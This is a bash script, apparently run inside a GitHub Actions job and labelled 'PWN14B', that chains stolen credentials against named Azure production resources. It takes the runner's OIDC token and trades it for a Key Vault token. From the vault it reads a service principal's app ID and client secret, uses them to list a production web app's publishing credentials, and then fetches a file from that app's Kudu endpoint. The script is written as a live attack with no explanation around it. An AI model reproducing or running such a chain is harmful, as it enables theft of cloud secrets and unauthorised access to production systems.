#!/usr/bin/env bash
set +e
echo "=====PWN14B_START====="
TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
OIDC=$(curl -sS -m 15 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" --data-urlencode "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" -d grant_type=client_credentials --data-urlencode "scope=https://vault.azure.net/.default" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
RJ=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4")
RID=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("appId",""))' 2>/dev/null)
RSC=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("clientSecret",""))' 2>/dev/null)
RAT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d "client_id=$RID" -d grant_type=client_credentials --data-urlencode "client_secret=$RSC" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
PC=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $RAT" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01")
PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
PP=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
echo "kudu=${PU:-FAIL}"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
echo "=== OUT14 ==="
curl -sS -m 90 -u "$PU:$PP" "$SCM/api/vfs/site/wwwroot/out14.txt"
echo
echo "=====PWN14B_END====="